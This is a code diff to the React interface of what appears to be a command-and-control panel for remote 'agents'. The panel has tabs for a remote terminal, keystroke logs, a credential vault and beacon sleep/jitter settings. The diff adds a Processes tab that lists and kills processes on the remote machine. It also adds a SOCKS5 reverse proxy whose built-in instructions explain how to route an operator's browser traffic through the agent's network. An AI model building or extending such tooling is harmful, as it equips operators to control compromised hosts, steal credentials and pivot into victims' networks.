@@ -10,7 +10,7 @@ function countryFlag(code) {
   );
 }
 
-const TABS = ['Terminal','Storage','Tasks','Display','Input Log','Vault','Config Store','Services','Network','Settings'];
+const TABS = ['Terminal','Storage','Tasks','Processes','Display','Input Log','Vault','Config Store','Services','Network','Settings'];
 
 export default function AgentModal({ agent, onClose }) {
   const [tab, setTab] = useState(0);
@@ -85,26 +85,29 @@ export default function AgentModal({ agent, onClose }) {
         {/* TAB 2: TASKS */}
         {tab === 2 && <TasksTab tasks={tasks} results={results} />}
 
-        {/* TAB 3: DISPLAY */}
-        {tab === 3 && <DisplayTab agentId={agent.id} />}
+        {/* TAB 3: PROCESSES */}
+        {tab === 3 && <ProcessesTab agentId={agent.id} />}
 
-        {/* TAB 4: INPUT LOG */}
-        {tab === 4 && <InputLogTab agentId={agent.id} />}
+        {/* TAB 4: DISPLAY */}
+        {tab === 4 && <DisplayTab agentId={agent.id} />}
 
-        {/* TAB 5: VAULT */}
-        {tab === 5 && <VaultTab creds={creds} agentId={agent.id} />}
+        {/* TAB 5: INPUT LOG */}
+        {tab === 5 && <InputLogTab agentId={agent.id} />}
 
-        {/* TAB 6: CONFIG STORE */}
-        {tab === 6 && <ConfigStoreTab agentId={agent.id} />}
+        {/* TAB 6: VAULT */}
+        {tab === 6 && <VaultTab creds={creds} agentId={agent.id} />}
 
-        {/* TAB 7: SERVICES */}
-        {tab === 7 && <ServicesTab agentId={agent.id} />}
+        {/* TAB 7: CONFIG STORE */}
+        {tab === 7 && <ConfigStoreTab agentId={agent.id} />}
 
-        {/* TAB 8: NETWORK */}
-        {tab === 8 && <NetworkTab agentId={agent.id} />}
+        {/* TAB 8: SERVICES */}
+        {tab === 8 && <ServicesTab agentId={agent.id} />}
 
-        {/* TAB 9: SETTINGS */}
-        {tab === 9 && <AgentSettingsTab agentId={agent.id} sleep={sleep} setSleep={setSleep} jitter={jitter} setJitter={setJitter} />}
+        {/* TAB 9: NETWORK */}
+        {tab === 9 && <NetworkTab agentId={agent.id} />}
+
+        {/* TAB 10: SETTINGS */}
+        {tab === 10 && <AgentSettingsTab agentId={agent.id} sleep={sleep} setSleep={setSleep} jitter={jitter} setJitter={setJitter} />}
       </div>
     </Modal>
   );
@@ -368,6 +371,175 @@ function StorageTab({ agentId }) {
           ))}
         </tbody>
       </table>
+    </div>
+  );
+}
+
+/* ========== PROCESSES TAB ========== */
+function ProcessesTab({ agentId }) {
+  const [processes, setProcesses] = useState([]);
+  const [loading, setLoading] = useState(false);
+  const [search, setSearch] = useState('');
+  const [sortCol, setSortCol] = useState('pid');
+  const [sortDir, setSortDir] = useState('asc');
+  const [pendingTaskId, setPendingTaskId] = useState(null);
+  const [killTarget, setKillTarget] = useState(null);
+  const intervalRef = useRef(null);
+
+  const fetchProcesses = useCallback(async () => {
+    setLoading(true);
+    try {
+      const res = await api.createTask(agentId, 'task_viewer_list', {});
+      setPendingTaskId(res.id);
+    } catch {
+      setLoading(false);
+    }
+  }, [agentId]);
+
+  // Poll for results
+  useEffect(() => {
+    if (!pendingTaskId) return;
+    const poll = setInterval(async () => {
+      try {
+        const results = await api.getAgentResults(agentId);
+        const result = results.find(r => r.task_id === pendingTaskId);
+        if (result) {
+          clearInterval(poll);
+          setPendingTaskId(null);
+          setLoading(false);
+          try {
+            const parsed = JSON.parse(result.output);
+            if (Array.isArray(parsed)) {
+              setProcesses(parsed);
+            }
+          } catch {}
+        }
+      } catch {}
+    }, 2000);
+    return () => clearInterval(poll);
+  }, [pendingTaskId, agentId]);
+
+  // Auto-refresh every 10 seconds
+  useEffect(() => {
+    fetchProcesses();
+    intervalRef.current = setInterval(fetchProcesses, 10000);
+    return () => clearInterval(intervalRef.current);
+  }, [fetchProcesses]);
+
+  const handleSort = (col) => {
+    if (sortCol === col) {
+      setSortDir(d => d === 'asc' ? 'desc' : 'asc');
+    } else {
+      setSortCol(col);
+      setSortDir('asc');
+    }
+  };
+
+  const filtered = processes.filter(p => {
+    if (!search) return true;
+    const s = search.toLowerCase();
+    return (p.name || '').toLowerCase().includes(s)
+      || (p.user || '').toLowerCase().includes(s)
+      || String(p.pid).includes(s);
+  });
+
+  const sorted = [...filtered].sort((a, b) => {
+    let va = a[sortCol], vb = b[sortCol];
+    if (typeof va === 'string') va = va.toLowerCase();
+    if (typeof vb === 'string') vb = vb.toLowerCase();
+    if (va < vb) return sortDir === 'asc' ? -1 : 1;
+    if (va > vb) return sortDir === 'asc' ? 1 : -1;
+    return 0;
+  });
+
+  const killProcess = async (pid) => {
+    try {
+      await api.createTask(agentId, 'task_viewer_kill', { pid });
+      setKillTarget(null);
+      setTimeout(fetchProcesses, 2000);
+    } catch {}
+  };
+
+  const sortIcon = (col) => {
+    if (sortCol !== col) return ' ↕';
+    return sortDir === 'asc' ? ' ↑' : ' ↓';
+  };
+
+  return (
+    <div style={{ padding: 16 }}>
+      <div style={{ display: 'flex', gap: 8, marginBottom: 12, alignItems: 'center' }}>
+        <input
+          type="text"
+          className="form-input"
+          placeholder="Search processes..."
+          value={search}
+          onChange={e => setSearch(e.target.value)}
+          spellCheck="false"
+          style={{ flex: 1, fontFamily: 'var(--font-mono)', fontSize: 11 }}
+        />
+        <button className="btn btn-sm" onClick={fetchProcesses} disabled={loading}>
+          {loading ? '⏳ LOADING...' : '🔄 REFRESH'}
+        </button>
+        <span style={{ fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)' }}>
+          {processes.length} processes
+        </span>
+      </div>
+      <table>
+        <thead>
+          <tr>
+            {[
+              { key: 'pid', label: 'PID' },
+              { key: 'name', label: 'Name' },
+              { key: 'user', label: 'User' },
+              { key: 'memory_mb', label: 'Memory (MB)' },
+            ].map(col => (
+              <th key={col.key} style={{ cursor: 'pointer', userSelect: 'none' }} onClick={() => handleSort(col.key)}>
+                {col.label}{sortIcon(col.key)}
+              </th>
+            ))}
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody>
+          {sorted.length === 0 && !loading && (
+            <tr><td colSpan={5} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>
+              {processes.length === 0 ? 'Loading process list...' : 'No matching processes'}
+            </td></tr>
+          )}
+          {loading && processes.length === 0 && (
+            <tr><td colSpan={5} style={{ color: 'var(--yellow)', textAlign: 'center' }}>
+              ⏳ Waiting for agent response...
+            </td></tr>
+          )}
+          {sorted.map((p, i) => (
+            <tr key={i}>
+              <td style={{ color: 'var(--green)' }}>{p.pid}</td>
+              <td>{p.name}</td>
+              <td style={{ color: 'var(--text-muted)' }}>{p.user || '-'}</td>
+              <td style={{ color: 'var(--text-sec)' }}>{p.memory_mb != null ? p.memory_mb.toFixed(1) : '-'}</td>
+              <td>
+                <button className="btn btn-sm btn-red" onClick={() => setKillTarget(p)}>KILL</button>
+              </td>
+            </tr>
+          ))}
+        </tbody>
+      </table>
+
+      <ConfirmModal
+        open={!!killTarget}
+        title="CONFIRM KILL PROCESS"
+        message={`Kill process "${killTarget?.name}" (PID ${killTarget?.pid})?`}
+        detail={
+          <>
+            <div><span style={{ color: 'var(--text-muted)' }}>PID: </span><span style={{ color: 'var(--green)' }}>{killTarget?.pid}</span></div>
+            <div><span style={{ color: 'var(--text-muted)' }}>NAME: </span><span style={{ color: 'var(--text-sec)' }}>{killTarget?.name}</span></div>
+            <div><span style={{ color: 'var(--text-muted)' }}>USER: </span><span style={{ color: 'var(--text-sec)' }}>{killTarget?.user || '-'}</span></div>
+          </>
+        }
+        confirmLabel="KILL"
+        onConfirm={() => killProcess(killTarget?.pid)}
+        onCancel={() => setKillTarget(null)}
+      />
     </div>
   );
 }
@@ -770,15 +942,79 @@ function ServicesTab({ agentId }) {
 
 /* ========== NETWORK TAB ========== */
 function NetworkTab({ agentId }) {
-  const [socksPort, setSocksPort] = useState(1080);
+  const [proxyActive, setProxyActive] = useState(false);
+  const [proxyPort, setProxyPort] = useState(0);
+  const [connections, setConnections] = useState(0);
+  const [loading, setLoading] = useState(false);
+  const [error, setError] = useState(null);
   const [fwdLocal, setFwdLocal] = useState('');
   const [fwdRemote, setFwdRemote] = useState('');
-  const [tunnels, setTunnels] = useState([]);
   const [forwards, setForwards] = useState([]);
+  const [copied, setCopied] = useState(false);
 
-  const startTunnel = () => {
-    api.createTask(agentId, 'tunnel_start', { type: 'socks5', port: socksPort });
+  // Poll tunnel status
+  const checkStatus = useCallback(async () => {
+    try {
+      const status = await api.tunnelStatus(agentId);
+      setProxyActive(status.active);
+      setProxyPort(status.port || 0);
+      setConnections(status.connections || 0);
+    } catch {}
+  }, [agentId]);
+
+  useEffect(() => {
+    checkStatus();
+    const interval = setInterval(checkStatus, 5000);
+    return () => clearInterval(interval);
+  }, [checkStatus]);
+
+  const startProxy = async () => {
+    setLoading(true);
+    setError(null);
+    try {
+      // First send tunnel_start task to agent to initiate WS connection
+      await api.createTask(agentId, 'tunnel_start', { type: 'socks5', port: 1080 });
+      // Wait a moment for agent to connect, then start the proxy
+      setTimeout(async () => {
+        try {
+          const res = await api.tunnelStart(agentId);
+          setProxyActive(true);
+          setProxyPort(res.port);
+          setLoading(false);
+        } catch (e) {
+          setError(e.message || 'Failed to start proxy relay');
+          setLoading(false);
+        }
+      }, 3000);
+    } catch (e) {
+      setError(e.message);
+      setLoading(false);
+    }
   };
+
+  const stopProxy = async () => {
+    setLoading(true);
+    try {
+      await api.tunnelStop(agentId);
+      await api.createTask(agentId, 'tunnel_stop', {});
+      setProxyActive(false);
+      setProxyPort(0);
+      setConnections(0);
+    } catch (e) {
+      setError(e.message);
+    }
+    setLoading(false);
+  };
+
+  const proxyUrl = proxyPort ? `socks5://${window.location.hostname}:${proxyPort}` : '';
+
+  const copyUrl = () => {
+    navigator.clipboard.writeText(proxyUrl).then(() => {
+      setCopied(true);
+      setTimeout(() => setCopied(false), 2000);
+    });
+  };
+
   const addForward = () => {
     api.createTask(agentId, 'tunnel_start', { type: 'portfwd', local: fwdLocal, remote: fwdRemote });
   };
@@ -787,30 +1023,85 @@ function NetworkTab({ agentId }) {
     <div style={{ padding: 16 }}>
       <div className="two-col">
         <div>
-          <div className="section-label">SOCKS5 Tunnel</div>
-          <div className="form-group">
-            <label className="form-label">Local Port</label>
+          <div className="section-label">SOCKS5 REVERSE PROXY</div>
+
+          {/* Status indicator */}
+          <div style={{
+            padding: 16,
+            border: `1px solid ${proxyActive ? 'var(--green)' : 'var(--border)'}`,
+            background: proxyActive ? 'rgba(0,255,136,0.05)' : 'var(--surface)',
+            marginBottom: 16,
+          }}>
+            <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 12 }}>
+              <span style={{
+                width: 8, height: 8, borderRadius: '50%',
+                background: proxyActive ? 'var(--green)' : 'var(--text-disabled)',
+                display: 'inline-block',
+                animation: proxyActive ? 'pulse 2s infinite' : 'none',
+              }} />
+              <span style={{
+                fontFamily: 'var(--font-mono)', fontSize: 11, fontWeight: 700,
+                color: proxyActive ? 'var(--green)' : 'var(--text-muted)',
+                letterSpacing: '1.4px', textTransform: 'uppercase',
+              }}>
+                {proxyActive ? 'PROXY ACTIVE' : 'PROXY INACTIVE'}
+              </span>
+              {proxyActive && (
+                <span style={{
+                  fontFamily: 'var(--font-mono)', fontSize: 10,
+                  color: 'var(--text-muted)', marginLeft: 'auto',
+                }}>
+                  {connections} connection{connections !== 1 ? 's' : ''}
+                </span>
+              )}
+            </div>
+
+            {proxyActive && proxyUrl && (
+              <div style={{
+                display: 'flex', gap: 8, alignItems: 'center',
+                padding: '8px 12px', background: 'rgba(0,0,0,0.3)',
+                border: '1px solid var(--border)', marginBottom: 12,
+              }}>
+                <span style={{
+                  fontFamily: 'var(--font-mono)', fontSize: 12,
+                  color: 'var(--green)', flex: 1,
+                }}>{proxyUrl}</span>
+                <button className="btn btn-sm" onClick={copyUrl}>
+                  {copied ? '✓ COPIED' : 'COPY'}
+                </button>
+              </div>
+            )}
+
+            {error && (
+              <div style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--red)', marginBottom: 8 }}>
+                ✕ {error}
+              </div>
+            )}
+
             <div style={{ display: 'flex', gap: 8 }}>
-              <input type="number" className="form-input" value={socksPort} onChange={e => setSocksPort(e.target.value)} style={{ width: 120 }} />
-              <button className="btn btn-green" onClick={startTunnel}>START TUNNEL</button>
+              {!proxyActive ? (
+                <button className="btn btn-green" onClick={startProxy} disabled={loading}>
+                  {loading ? '⏳ STARTING...' : '▶ START PROXY'}
+                </button>
+              ) : (
+                <button className="btn btn-red" onClick={stopProxy} disabled={loading}>
+                  {loading ? '⏳ STOPPING...' : '■ STOP PROXY'}
+                </button>
+              )}
             </div>
           </div>
-          <div className="section-label" style={{ marginTop: 20 }}>Active Tunnels</div>
-          <table>
-            <thead><tr><th>Port</th><th>Type</th><th>Status</th><th>Bytes TX</th><th>Actions</th></tr></thead>
-            <tbody>
-              {tunnels.length === 0 ? (
-                <tr><td colSpan={5} style={{ textAlign: 'center', color: 'var(--text-disabled)' }}>No active tunnels</td></tr>
-              ) : tunnels.map((t, i) => (
-                <tr key={i}>
-                  <td>{t.port}</td><td>{t.type}</td>
-                  <td style={{ color: 'var(--green)' }}>RUNNING</td>
-                  <td>{t.bytes}</td>
-                  <td><button className="btn btn-sm btn-red">STOP</button></td>
-                </tr>
-              ))}
-            </tbody>
-          </table>
+
+          <div style={{
+            padding: 12, border: '1px solid var(--border)', background: 'var(--surface)',
+            fontFamily: 'var(--font-mono)', fontSize: 10, color: 'var(--text-muted)',
+            lineHeight: 1.8,
+          }}>
+            <div style={{ color: 'var(--text-sec)', fontWeight: 700, marginBottom: 4 }}>HOW IT WORKS</div>
+            <div>1. Agent connects to C2 via WebSocket tunnel</div>
+            <div>2. C2 opens a local SOCKS5 port</div>
+            <div>3. Configure your browser: <span style={{ color: 'var(--green)' }}>socks5://server:PORT</span></div>
+            <div>4. All traffic routes through the agent's network</div>
+          </div>
         </div>
         <div>
           <div className="section-label">Port Forwarding</div>
